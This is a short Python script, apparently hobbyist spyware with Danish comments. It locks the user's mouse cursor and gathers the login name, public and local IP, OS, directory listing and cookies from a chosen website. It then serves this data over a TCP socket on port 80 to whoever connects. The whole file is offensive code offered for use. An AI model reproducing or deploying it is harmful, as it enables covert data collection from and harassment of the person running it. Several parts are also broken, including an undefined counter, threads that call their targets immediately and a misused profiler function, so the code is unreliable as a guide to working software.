import mouse
import socket
from sys import platform, api_version, getprofile
from os import getlogin, listdir
from time import sleep
import threading
from requests import get

# FARVER #
red = "\033[91;1m"
reset = "\033[0m"
green = "\033[92;1m"
cyan = "\033[96;1m"
yellow = "\033[93;1m"
magenta = "\033[95;1m"
blue = "\033[94;1m"
white = "\033[97;1m"
blink = "\033[5m"
# END OF FARVER

HOST = "" # your local ip address
PORT = 80
website_coockie_to_get = ""
time_mouse_locked = 100
mouse_pos_x = 0
mouse_pos_y = 0
BUFFER = 1024*3



def lock_mouse(X, Y, time_in_milliseconds):
    pos = (X,Y)
    mouse.move(X, Y)
    while True:
        num += 1
        if mouse.get_position() != pos:
            mouse.move(pos[0], pos[1])
            sleep(time_in_milliseconds)
        else:
            pass
        
        if num >= time_in_milliseconds:
            break

def listen_for_host(host,port):
    address = (host,port)
    print(f"Getting information...")
    get_os_info("https://" + website_coockie_to_get)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.bind(address)
    except:
        print(F"couldnt bind to {address[0]}:{address[1]} are you sure its the right ip?")
    print(f"Listening for host...")
    sock.listen(5)
    try:
        conn, ip = sock.accept()
    except:
        print(f"[+] couldnt recive the connection...")
    print(f"[+] Connection recived!")
    msg =   f"\
            user: {info_list[0]}\n\
            public ip: {info_list[1]}\n\
            local ip: {info_list[2]}\n\
            operating system: {info_list[3]}\n\
            directory contents: {info_list[4]}\n\
            profiles: {info_list[5]}\n\
            api version: {info_list[6]}\n\
            coockie: {info_list[7]}\n"

    conn.send(f"\n{msg}".encode())
    conn.close()
    exit()
    
    

def get_os_info(website_to_get_cookie):

    global info_list
    info_list = []

    user = getlogin()
    public_ip = get('https://api.ipify.org').text
    local_ip = socket.gethostbyname(socket.gethostname())
    operating_system = platform
    dir_content = listdir()
    profiles = getprofile()
    api = api_version
    coockie = get(website_to_get_cookie).cookies
    
    all = user, public_ip, local_ip, operating_system, dir_content, profiles, api, coockie

    for i in all:
        info_list.append(i)


lock_mouse_pos = threading.Thread(target=lock_mouse(mouse_pos_x,mouse_pos_y,time_mouse_locked)).start()
send_info_to_host = threading.Thread(target=listen_for_host(HOST,PORT)).start()
